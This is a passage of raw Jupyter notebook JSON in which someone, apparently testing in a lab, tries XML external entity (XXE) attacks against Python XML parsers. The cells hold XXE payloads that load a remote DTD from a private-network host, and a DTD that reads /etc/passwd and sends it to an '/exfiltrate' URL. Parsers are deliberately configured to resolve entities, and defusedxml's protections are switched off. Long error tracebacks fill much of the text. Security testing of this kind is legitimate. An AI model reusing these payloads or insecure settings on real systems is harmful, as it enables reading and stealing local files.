      "http://192.168.30.102:9090/xxe.dtd None <lxml.etree._ParserContext object at 0x7f90020a01c0>\n",
      "http://192.168.30.102:9090/xxe.dtd\n",
      "file:///etc/hostname None <lxml.etree._ParserContext object at 0x7f90020a01c0>\n",
      "file:///etc/hostname\n"
     ]
    },
    {
     "ename": "XMLSyntaxError",
     "evalue": "internal error: xmlParseInternalSubset: error detected in Markup declaration\n, line 1, column 1 (hostname, line 1)",
     "output_type": "error",
     "traceback": [
      "Traceback \u001b[0;36m(most recent call last)\u001b[0m:\n",
      "\u001b[0m  File \u001b[1;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/IPython/core/interactiveshell.py:3508\u001b[0m in \u001b[1;35mrun_code\u001b[0m\n    exec(code_obj, self.user_global_ns, self.user_ns)\u001b[0m\n",
      "\u001b[0m  Cell \u001b[1;32mIn[212], line 42\u001b[0m\n    root = fromstring(xml_data_bytes, parser=parser, forbid_dtd=False, forbid_entities=False)\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/defusedxml/lxml.py:143\u001b[0m in \u001b[1;35mfromstring\u001b[0m\n    rootelement = _etree.fromstring(text, parser, base_url=base_url)\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/etree.pyx:3257\u001b[0m in \u001b[1;35mlxml.etree.fromstring\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:1916\u001b[0m in \u001b[1;35mlxml.etree._parseMemoryDocument\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:1803\u001b[0m in \u001b[1;35mlxml.etree._parseDoc\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:1144\u001b[0m in \u001b[1;35mlxml.etree._BaseParser._parseDoc\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:618\u001b[0m in \u001b[1;35mlxml.etree._ParserContext._handleParseResultDoc\u001b[0m\n",
      "\u001b[0m  File \u001b[1;32msrc/lxml/parser.pxi:728\u001b[0m in \u001b[1;35mlxml.etree._handleParseResult\u001b[0m\n",
      "\u001b[0;36m  File \u001b[0;32msrc/lxml/parser.pxi:657\u001b[0;36m in \u001b[0;35mlxml.etree._raiseParseError\u001b[0;36m\n",
      "\u001b[0;36m  File \u001b[0;32mfile:///etc/hostname:1\u001b[0;36m\u001b[0m\n\u001b[0;31mXMLSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m internal error: xmlParseInternalSubset: error detected in Markup declaration\n, line 1, column 1\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# working\n",
    "from defusedxml.lxml import fromstring\n",
    "import requests\n",
    "\n",
    "class CustomResolver(etree.Resolver):\n",
    "    def resolve(self, url, id, context):\n",
    "        print(url, id, context)\n",
    "        if url.startswith(\"http://\"):\n",
    "            print(url)\n",
    "            # response = requests.get(url)\n",
    "            # if response.status_code == 200:\n",
    "            #     dtd_data = response.text\n",
    "            #     return self.resolve_string(dtd_data, context)\n",
    "            \n",
    "        elif url.startswith(\"file://\"):\n",
    "            print(url)\n",
    "            # Read the local file content\n",
    "        #     file_path = url[7:]\n",
    "        #     with open(file_path, \"r\") as file:\n",
    "        #         content = file.read()\n",
    "        #     return self.resolve_string(content, context)\n",
    "        # return None\n",
    "        \n",
    "        else:\n",
    "            print(\"done\")\n",
    "\n",
    "xml_data = '''<?xml version=\"1.0\"?>\n",
    "<!DOCTYPE foo [\n",
    "<!ENTITY % dtd SYSTEM \"http://192.168.30.102:9090/xxe.dtd\">\n",
    "%dtd;\n",
    "%file;\n",
    "]>\n",
    "<foo>\n",
    "</foo>\n",
    "'''\n",
    "\n",
    "# Encode the XML data as a byte string\n",
    "xml_data_bytes = xml_data.encode('utf-8')\n",
    "\n",
    "parser = etree.XMLParser(load_dtd=True, no_network=False, resolve_entities=True)\n",
    "parser.resolvers.add(CustomResolver())\n",
    "root = fromstring(xml_data_bytes, parser=parser, forbid_dtd=False, forbid_entities=False)   \n",
    "\n",
    "# You can now process the XML tree with root as the root element\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 176,
   "id": "3d8bd3b4-1df8-4e2f-ba3e-700c01c59be3",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Start element: foo\n",
      "End element: foo\n"
     ]
    }
   ],
   "source": [
    "import xml.sax\n",
    "import xml.sax.handler\n",
    "from lxml import etree\n",
    "\n",
    "class CustomEntityResolver(xml.sax.handler.EntityResolver):\n",
    "    def resolveEntity(self, publicId, systemId):\n",
    "        if systemId.endswith('sample.dtd'):\n",
    "            dtd_data = '''<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n",
    "<!ENTITY % eval \"<!ENTITY xxe SYSTEM 'http://192.168.30.102:9091/exfiltrate?data=%file;'>\">\n",
    "%eval;'''\n",
    "            return xml.sax.InputSource(None, dtd_data)\n",
    "        return None\n",
    "\n",
    "class CustomContentHandler(xml.sax.handler.ContentHandler):\n",
    "    def startElement(self, name, attrs):\n",
    "        print(\"StartElement:\", name)\n",
    "\n",
    "    def endElement(self, name):\n",
    "        print(\"EndElement:\", name)\n",
    "\n",
    "xml_data = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<!DOCTYPE foo [\n",
    "  <!ENTITY % remote SYSTEM \"http://192.168.30.102:9090/xxe.dtd\">\n",
    "  %remote;\n",
    "]>\n",
    "<foo>&data;</foo>\n",
    "'''\n",
    "\n",
    "    parser = xml.sax.make_parser()\n",
    "    parser.setEntityResolver(CustomEntityResolver())\n",
    "    parser.setContentHandler(CustomContentHandler())\n",
    "\n",
    "\n",
    "xml.sax.parseString(xml_data, handler)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 170,
   "id": "3830b3e4-a988-4126-a414-69c94fbf6d26",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Error: Entity 'xxe' not defined, line 6, column 11 (<string>, line 6)\n"
     ]
    }
   ],
   "source": [
    "from lxml import etree\n",
    "\n",
    "def parse_vulnerable(xml_string):\n",
    "    parser = etree.XMLParser(resolve_entities=True)\n",
    "    tree = etree.fromstring(xml_string.encode('utf-8'), parser)\n",
    "    return tree\n",
    "\n",
    "xml_string = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n",
    "<!DOCTYPE foo [\n",
    "  <!ENTITY % remote SYSTEM \"http://192.168.30.102:9090/xxe.dtd\">\n",
    "  %remote;\n",
    "]>\n",
    "<foo>&xxe;</foo>\n",
    "'''\n",
    "\n",
    "try:\n",
    "    tree = parse_vulnerable(xml_string)\n",
    "    print(etree.tostring(tree, pretty_print=True).decode())\n",
    "except etree.XMLSyntaxError as e:\n",
    "    print(f\"Error: {e}\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 192,
   "id": "aa95a38a-7262-4866-9a94-977e38a14764",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "ename": "SSLError",
     "evalue": "HTTPSConnectionPool(host='192.168.30.102', port=9091): Max retries exceeded with url: / (Caused by SSLError(SSLEOFError(8, 'EOF occurred in violation of protocol (_ssl.c:1129)')))",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mSSLEOFError\u001b[0m                               Traceback (most recent call last)",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/connectionpool.py:699\u001b[0m, in \u001b[0;36mHTTPConnectionPool.urlopen\u001b[0;34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, **response_kw)\u001b[0m\n\u001b[1;32m    698\u001b[0m \u001b[38;5;66;03m# Make the request on the httplib connection object.\u001b[39;00m\n\u001b[0;32m--> 699\u001b[0m httplib_response \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_make_request\u001b[49m\u001b[43m(\u001b[49m\n\u001b[1;32m    700\u001b[0m \u001b[43m    \u001b[49m\u001b[43mconn\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    701\u001b[0m \u001b[43m    \u001b[49m\u001b[43mmethod\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    702\u001b[0m \u001b[43m    \u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    703\u001b[0m \u001b[43m    \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mtimeout_obj\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    704\u001b[0m \u001b[43m    \u001b[49m\u001b[43mbody\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mbody\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    705\u001b[0m \u001b[43m    \u001b[49m\u001b[43mheaders\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mheaders\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    706\u001b[0m \u001b[43m    \u001b[49m\u001b[43mchunked\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mchunked\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    707\u001b[0m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    709\u001b[0m \u001b[38;5;66;03m# If we're going to release the connection in ``finally:``, then\u001b[39;00m\n\u001b[1;32m    710\u001b[0m \u001b[38;5;66;03m# the response doesn't need to know about the connection. Otherwise\u001b[39;00m\n\u001b[1;32m    711\u001b[0m \u001b[38;5;66;03m# it will also try to release it and we'll have a double-release\u001b[39;00m\n\u001b[1;32m    712\u001b[0m \u001b[38;5;66;03m# mess.\u001b[39;00m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/connectionpool.py:382\u001b[0m, in \u001b[0;36mHTTPConnectionPool._make_request\u001b[0;34m(self, conn, method, url, timeout, chunked, **httplib_request_kw)\u001b[0m\n\u001b[1;32m    381\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[0;32m--> 382\u001b[0m     \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_validate_conn\u001b[49m\u001b[43m(\u001b[49m\u001b[43mconn\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    383\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m (SocketTimeout, BaseSSLError) \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[1;32m    384\u001b[0m     \u001b[38;5;66;03m# Py2 raises this as a BaseSSLError, Py3 raises it as socket timeout.\u001b[39;00m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/connectionpool.py:1010\u001b[0m, in \u001b[0;36mHTTPSConnectionPool._validate_conn\u001b[0;34m(self, conn)\u001b[0m\n\u001b[1;32m   1009\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28mgetattr\u001b[39m(conn, \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124msock\u001b[39m\u001b[38;5;124m\"\u001b[39m, \u001b[38;5;28;01mNone\u001b[39;00m):  \u001b[38;5;66;03m# AppEngine might not have  `.sock`\u001b[39;00m\n\u001b[0;32m-> 1010\u001b[0m     \u001b[43mconn\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mconnect\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m   1012\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m conn\u001b[38;5;241m.\u001b[39mis_verified:\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/connection.py:411\u001b[0m, in \u001b[0;36mHTTPSConnection.connect\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    409\u001b[0m     context\u001b[38;5;241m.\u001b[39mload_default_certs()\n\u001b[0;32m--> 411\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39msock \u001b[38;5;241m=\u001b[39m \u001b[43mssl_wrap_socket\u001b[49m\u001b[43m(\u001b[49m\n\u001b[1;32m    412\u001b[0m \u001b[43m    \u001b[49m\u001b[43msock\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mconn\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    413\u001b[0m \u001b[43m    \u001b[49m\u001b[43mkeyfile\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mkey_file\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    414\u001b[0m \u001b[43m    \u001b[49m\u001b[43mcertfile\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mcert_file\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    415\u001b[0m \u001b[43m    \u001b[49m\u001b[43mkey_password\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mkey_password\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    416\u001b[0m \u001b[43m    \u001b[49m\u001b[43mca_certs\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mca_certs\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    417\u001b[0m \u001b[43m    \u001b[49m\u001b[43mca_cert_dir\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mca_cert_dir\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    418\u001b[0m \u001b[43m    \u001b[49m\u001b[43mca_cert_data\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mca_cert_data\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    419\u001b[0m \u001b[43m    \u001b[49m\u001b[43mserver_hostname\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mserver_hostname\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    420\u001b[0m \u001b[43m    \u001b[49m\u001b[43mssl_context\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mcontext\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    421\u001b[0m \u001b[43m    \u001b[49m\u001b[43mtls_in_tls\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mtls_in_tls\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    422\u001b[0m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    424\u001b[0m \u001b[38;5;66;03m# If we're using all defaults and the connection\u001b[39;00m\n\u001b[1;32m    425\u001b[0m \u001b[38;5;66;03m# is TLSv1 or TLSv1.1 we throw a DeprecationWarning\u001b[39;00m\n\u001b[1;32m    426\u001b[0m \u001b[38;5;66;03m# for the host.\u001b[39;00m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/util/ssl_.py:453\u001b[0m, in \u001b[0;36mssl_wrap_socket\u001b[0;34m(sock, keyfile, certfile, cert_reqs, ca_certs, server_hostname, ssl_version, ciphers, ssl_context, ca_cert_dir, key_password, ca_cert_data, tls_in_tls)\u001b[0m\n\u001b[1;32m    452\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[0;32m--> 453\u001b[0m     ssl_sock \u001b[38;5;241m=\u001b[39m \u001b[43m_ssl_wrap_socket_impl\u001b[49m\u001b[43m(\u001b[49m\u001b[43msock\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mcontext\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtls_in_tls\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    454\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m ssl_sock\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/util/ssl_.py:495\u001b[0m, in \u001b[0;36m_ssl_wrap_socket_impl\u001b[0;34m(sock, ssl_context, tls_in_tls, server_hostname)\u001b[0m\n\u001b[1;32m    494\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[0;32m--> 495\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mssl_context\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mwrap_socket\u001b[49m\u001b[43m(\u001b[49m\u001b[43msock\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/ssl.py:500\u001b[0m, in \u001b[0;36mSSLContext.wrap_socket\u001b[0;34m(self, sock, server_side, do_handshake_on_connect, suppress_ragged_eofs, server_hostname, session)\u001b[0m\n\u001b[1;32m    494\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mwrap_socket\u001b[39m(\u001b[38;5;28mself\u001b[39m, sock, server_side\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mFalse\u001b[39;00m,\n\u001b[1;32m    495\u001b[0m                 do_handshake_on_connect\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mTrue\u001b[39;00m,\n\u001b[1;32m    496\u001b[0m                 suppress_ragged_eofs\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mTrue\u001b[39;00m,\n\u001b[1;32m    497\u001b[0m                 server_hostname\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mNone\u001b[39;00m, session\u001b[38;5;241m=\u001b[39m\u001b[38;5;28;01mNone\u001b[39;00m):\n\u001b[1;32m    498\u001b[0m     \u001b[38;5;66;03m# SSLSocket class handles server_hostname encoding before it calls\u001b[39;00m\n\u001b[1;32m    499\u001b[0m     \u001b[38;5;66;03m# ctx._wrap_socket()\u001b[39;00m\n\u001b[0;32m--> 500\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msslsocket_class\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_create\u001b[49m\u001b[43m(\u001b[49m\n\u001b[1;32m    501\u001b[0m \u001b[43m        \u001b[49m\u001b[43msock\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43msock\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    502\u001b[0m \u001b[43m        \u001b[49m\u001b[43mserver_side\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mserver_side\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    503\u001b[0m \u001b[43m        \u001b[49m\u001b[43mdo_handshake_on_connect\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mdo_handshake_on_connect\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    504\u001b[0m \u001b[43m        \u001b[49m\u001b[43msuppress_ragged_eofs\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43msuppress_ragged_eofs\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    505\u001b[0m \u001b[43m        \u001b[49m\u001b[43mserver_hostname\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mserver_hostname\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    506\u001b[0m \u001b[43m        \u001b[49m\u001b[43mcontext\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m,\u001b[49m\n\u001b[1;32m    507\u001b[0m \u001b[43m        \u001b[49m\u001b[43msession\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43msession\u001b[49m\n\u001b[1;32m    508\u001b[0m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/ssl.py:1040\u001b[0m, in \u001b[0;36mSSLSocket._create\u001b[0;34m(cls, sock, server_side, do_handshake_on_connect, suppress_ragged_eofs, server_hostname, context, session)\u001b[0m\n\u001b[1;32m   1039\u001b[0m             \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;167;01mValueError\u001b[39;00m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mdo_handshake_on_connect should not be specified for non-blocking sockets\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m-> 1040\u001b[0m         \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mdo_handshake\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m   1041\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m (\u001b[38;5;167;01mOSError\u001b[39;00m, \u001b[38;5;167;01mValueError\u001b[39;00m):\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/ssl.py:1309\u001b[0m, in \u001b[0;36mSSLSocket.do_handshake\u001b[0;34m(self, block)\u001b[0m\n\u001b[1;32m   1308\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39msettimeout(\u001b[38;5;28;01mNone\u001b[39;00m)\n\u001b[0;32m-> 1309\u001b[0m     \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43m_sslobj\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mdo_handshake\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m   1310\u001b[0m \u001b[38;5;28;01mfinally\u001b[39;00m:\n",
      "\u001b[0;31mSSLEOFError\u001b[0m: EOF occurred in violation of protocol (_ssl.c:1129)",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mMaxRetryError\u001b[0m                             Traceback (most recent call last)",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/requests/adapters.py:486\u001b[0m, in \u001b[0;36mHTTPAdapter.send\u001b[0;34m(self, request, stream, timeout, verify, cert, proxies)\u001b[0m\n\u001b[1;32m    485\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[0;32m--> 486\u001b[0m     resp \u001b[38;5;241m=\u001b[39m \u001b[43mconn\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43murlopen\u001b[49m\u001b[43m(\u001b[49m\n\u001b[1;32m    487\u001b[0m \u001b[43m        \u001b[49m\u001b[43mmethod\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mrequest\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mmethod\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    488\u001b[0m \u001b[43m        \u001b[49m\u001b[43murl\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    489\u001b[0m \u001b[43m        \u001b[49m\u001b[43mbody\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mrequest\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mbody\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    490\u001b[0m \u001b[43m        \u001b[49m\u001b[43mheaders\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mrequest\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mheaders\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    491\u001b[0m \u001b[43m        \u001b[49m\u001b[43mredirect\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[1;32m    492\u001b[0m \u001b[43m        \u001b[49m\u001b[43massert_same_host\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[1;32m    493\u001b[0m \u001b[43m        \u001b[49m\u001b[43mpreload_content\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[1;32m    494\u001b[0m \u001b[43m        \u001b[49m\u001b[43mdecode_content\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43;01mFalse\u001b[39;49;00m\u001b[43m,\u001b[49m\n\u001b[1;32m    495\u001b[0m \u001b[43m        \u001b[49m\u001b[43mretries\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mmax_retries\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    496\u001b[0m \u001b[43m        \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mtimeout\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    497\u001b[0m \u001b[43m        \u001b[49m\u001b[43mchunked\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mchunked\u001b[49m\u001b[43m,\u001b[49m\n\u001b[1;32m    498\u001b[0m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    500\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m (ProtocolError, \u001b[38;5;167;01mOSError\u001b[39;00m) \u001b[38;5;28;01mas\u001b[39;00m err:\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/connectionpool.py:755\u001b[0m, in \u001b[0;36mHTTPConnectionPool.urlopen\u001b[0;34m(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, **response_kw)\u001b[0m\n\u001b[1;32m    753\u001b[0m     e \u001b[38;5;241m=\u001b[39m ProtocolError(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mConnection aborted.\u001b[39m\u001b[38;5;124m\"\u001b[39m, e)\n\u001b[0;32m--> 755\u001b[0m retries \u001b[38;5;241m=\u001b[39m \u001b[43mretries\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mincrement\u001b[49m\u001b[43m(\u001b[49m\n\u001b[1;32m    756\u001b[0m \u001b[43m    \u001b[49m\u001b[43mmethod\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43murl\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43merror\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43me\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m_pool\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m_stacktrace\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43msys\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mexc_info\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\u001b[43m[\u001b[49m\u001b[38;5;241;43m2\u001b[39;49m\u001b[43m]\u001b[49m\n\u001b[1;32m    757\u001b[0m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    758\u001b[0m retries\u001b[38;5;241m.\u001b[39msleep()\n",
      "File \u001b[0;32m~/miniconda3/envs/vulx/lib/python3.9/site-packages/urllib3/util/retry.py:574\u001b[0m, in \u001b[0;36mRetry.increment\u001b[0;34m(self, method, url, response, error, _pool, _stacktrace)\u001b[0m\n\u001b[1;32m    573\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m new_retry\u001b[38;5;241m.\u001b[39mis_exhausted():\n\u001b[0;32m--> 574\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m MaxRetryError(_pool, url, error \u001b[38;5;129;01mor\u001b[39;00m ResponseError(cause))\n\u001b[1;32m    576\u001b[0m log\u001b[38;5;241m.\u001b[39mdebug(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mIncremented Retry for (url=\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;132;01m%s\u001b[39;00m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m): \u001b[39m\u001b[38;5;132;01m%r\u001b[39;00m\u001b[38;5;124m\"\u001b[39m, url, new_retry)\n",
      "\u001b[0;31mMaxRetryError\u001b[0m: HTTPSConnectionPool(host='192.168.30.102', port=9091): Max retries exceeded with url: / (Caused by SSLError(SSLEOFError(8, 'EOF occurred in violation of protocol (_ssl.c:1129)')))",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mSSLError\u001b[0m                                  Traceback (most recent call last)",
